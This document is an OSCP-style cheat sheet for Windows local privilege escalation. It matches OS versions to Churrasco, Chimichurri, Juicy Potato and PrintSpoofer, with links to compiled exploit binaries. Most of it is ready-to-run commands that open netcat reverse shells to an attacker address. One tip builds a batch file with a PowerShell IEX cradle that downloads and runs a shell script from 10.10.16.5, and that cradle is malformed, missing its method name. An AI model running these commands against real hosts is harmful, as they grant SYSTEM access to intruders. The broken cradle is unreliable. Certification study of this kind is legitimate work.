# OSCP-TOOLS

# Windows Server 2003 old windows :

--> If SEImpersonate is Enabled use following exploit - https://github.com/Re4son/Churrasco/raw/master/churrasco.exe
--> Upload nc binary and execute following command.

~ Command : .\churrasco.exe -d "nc.exe <attacker-ip> <attacker-port> -e cmd.exe"

# Windows Server 2008 R2 DataCenter :

--> If 6.1.7600 N/A Build 7600 version the use following exploit - https://github.com/egre55/windows-kernel-exploits/blob/master/MS10-059:%20Chimichurri/Compiled/Chimichurri.exe

# Microsoft Windows 7 Enterprise :

--> If 6.1.7600 N/A Build 7600 version the use following exploit - https://github.com/egre55/windows-kernel-exploits/blob/master/MS10-059:%20Chimichurri/Compiled/Chimichurri.exe

~ Command : exploit.exe <attacker-ip> <attacker-port>

# Juicy Potato attacks :

$_Affected_Windows_Verisons

    Windows_10_Enterprise
    Windows_10_Pro
    Windows_7_Enterprise
    Windows_8.1_Enterprise
    Windows_Server_2008_R2_Enterprise
    Windows_Server_2012_Datacenter

📌 Juicy Potato does not work for Windows Server 2019 and Windows 10 versions 1809 and higher. - https://github.com/ohpe/juicy-potato/releases

--> For CLSID - http://ohpe.it/juicy-potato/CLSID/

~ Command : juicypotato.exe -l 1337 -t * -p "C:\Windows\Tasks\nc.exe <IP> <port> -e cmd.exe"
TIP : If upper command doesn't work then try to do the following thing:
        1. Get ready with the nishang reverse shell script edit it with necessary data. Then create a bat file on any machine with IEX file downloader one-liner.--- echo powershell -c "IEX (new-object net.webclient).('http://10.10.16.5/shell.ps1')" > shell.bat ---
        2. Then host a python web server and download the .bat file in target machine. After downloading run it as follows-
        3. .\jp.exe -t * -l 1337 -p shell.bat (This will give shell as NT Authority\System) If this doesn't work then also change the CLSID using -c parameter.

# PrinSpoofer Exploit on SEImpersonate : 

--> If the host is Windows Server 2016, 2019 or Windows 10 use this exploit if it has SEImpersoante permission - https://github.com/dievus/printspoofer/blob/master/PrintSpoofer.exe
